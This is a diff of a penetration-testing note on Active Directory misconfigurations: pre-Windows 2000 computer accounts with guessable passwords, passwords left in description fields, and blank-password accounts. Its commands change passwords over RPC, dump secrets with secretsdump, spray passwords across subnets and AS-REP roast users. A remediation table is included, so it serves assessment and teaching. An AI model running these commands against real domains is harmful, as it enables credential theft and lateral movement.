@@ -10,9 +10,9 @@ Read the technical blog by [TrustedSec](https://www.trustedsec.com/blog/diving-i
 
 When a computer account is pre-created in AD with the **"Pre-Windows 2000 compatible access"** option checked, the account's password is set to the **lowercase computer name** (without the `$`).
 
-Example: account `HOSTA$` → password `hosta`
+Example: account `HOSTA$` -> password `hosta`
 
-These accounts are often created and never joined to a domain — so the password **never rotates**. They just sit there with a known password forever.
+These accounts are often created and never joined to a domain - so the password **never rotates**. They just sit there with a known password forever.
 
 ### How to Identify Them
 
@@ -20,7 +20,7 @@ These accounts have `userAccountControl = 4128` which combines:
 - `PASSWD_NOTREQD` (0x0020)
 - `WORKSTATION_TRUST_ACCOUNT` (0x1000)
 
-And critically: `logonCount = 0` — the account was never actually used.
+And critically: `logonCount = 0` - the account was never actually used.
 
 ```sh
 # Find pre2k accounts via LDAP (filter for UAC=4128)
@@ -36,15 +36,15 @@ nxc ldap <DC-IP> -u user -p pass -M pre2k
 
 ### The Attack
 
-The catch: trying to authenticate directly with `HOSTA$:hosta` returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` — Windows refuses auth for an unjoined machine account.
+The catch: trying to authenticate directly with `HOSTA$:hosta` returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` - Windows refuses auth for an unjoined machine account.
 
 **Fix:** Change the password first using RPC, then authenticate normally.
 
 ```sh
-# Step 1 — Change the password via RPC (you know the current password)
+# Step 1 - Change the password via RPC (you know the current password)
 rpcchangepwd.py corp.local/HOSTA\$:'hosta'@<DC-IP> -newpass 'NewPass123!'
 
-# Step 2 — Now authenticate normally with the new password
+# Step 2 - Now authenticate normally with the new password
 nxc smb <DC-IP> -u 'HOSTA$' -p 'NewPass123!' -d corp.local
 secretsdump.py corp.local/'HOSTA$':'NewPass123!'@<DC-IP>
 
@@ -52,11 +52,11 @@ secretsdump.py corp.local/'HOSTA$':'NewPass123!'@<DC-IP>
 nxc smb <cidr> -u 'HOSTA$' -p 'NewPass123!' -d corp.local
 ```
 
-`rpcchangepwd.py` is an Impacket script — may need to grab it from the Impacket examples if not in PATH.
+`rpcchangepwd.py` is an Impacket script - may need to grab it from the Impacket examples if not in PATH.
 
 ### Why This Matters
 
-Machine accounts (`$`) are domain accounts — they can:
+Machine accounts (`$`) are domain accounts - they can:
 - Be Kerberoasted if they have SPNs
 - Be used for BloodHound collection
 - Have ACL paths to privileged objects
@@ -68,12 +68,12 @@ Machine accounts (`$`) are domain accounts — they can:
 
 ### What It Is
 
-Admins sometimes set temporary passwords in the **description** or **info** field of user accounts, then forget to remove them. These fields are readable by **any authenticated domain user** — sometimes even unauthenticated via LDAP anonymous bind.
+Admins sometimes set temporary passwords in the **description** or **info** field of user accounts, then forget to remove them. These fields are readable by **any authenticated domain user** - sometimes even unauthenticated via LDAP anonymous bind.
 
 ### How to Find Them
 
 ```sh
-# nxc — shows description field in output
+# nxc - shows description field in output
 nxc ldap <DC-IP> -u user -p pass --users
 # Look for any description that looks like a password
 
@@ -95,7 +95,7 @@ ldapsearch -H ldap://<DC-IP> -x -b "dc=corp,dc=local" \
 # Validate the credential
 nxc smb <DC-IP> -u found_user -p 'DescriptionPassword' -d corp.local
 
-# Spray it — maybe it's a shared password pattern
+# Spray it - maybe it's a shared password pattern
 nxc smb <cidr> -u users.txt -p 'DescriptionPassword' -d corp.local --continue-on-success
 ```
 
@@ -105,7 +105,7 @@ nxc smb <cidr> -u users.txt -p 'DescriptionPassword' -d corp.local --continue-on
 
 ### What It Is
 
-User accounts with `PASSWD_NOTREQD` set in `userAccountControl` are not required to have a password — they can authenticate with a **blank password**.
+User accounts with `PASSWD_NOTREQD` set in `userAccountControl` are not required to have a password - they can authenticate with a **blank password**.
 
 ### How to Find Them
 
@@ -138,7 +138,7 @@ GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass
 
 ## Remediation (For Report Writing)
 
-**Root cause:** These misconfigurations share a common theme — someone took a shortcut and no process exists to catch or remediate them over time.
+**Root cause:** These misconfigurations share a common theme - someone took a shortcut and no process exists to catch or remediate them over time.
 
 | Finding | Remediation |
 |---|---|
@@ -153,7 +153,7 @@ GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass
 
 ## Quick Misconfig Checklist
 
-Run these any time you have domain credentials — takes 2 minutes and can hand you another account:
+Run these any time you have domain credentials - takes 2 minutes and can hand you another account:
 
 ```sh
 # 1. Users with passwords in description
